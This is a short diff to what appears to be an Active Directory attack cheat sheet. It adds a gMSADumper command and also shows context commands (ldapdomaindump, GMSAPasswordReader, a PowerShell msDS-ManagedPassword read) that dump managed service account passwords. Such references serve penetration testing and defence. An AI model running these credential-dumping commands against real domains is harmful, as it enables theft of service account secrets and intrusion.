@@ -1057,6 +1057,12 @@ ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP
   GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
   ```
 
+* [gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)
+   ```powershell
+  # https://github.com/micahvandeusen/gMSADumper
+  python3 gMSADumper.py -u User -p Password1 -d domain.local
+  ```
+  
 * Active Directory Powershell
   ```ps1
   $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
@@ -1066,7 +1072,6 @@ ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP
   ```
 
 * [gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
-
 
 ### Reading LAPS Password
 
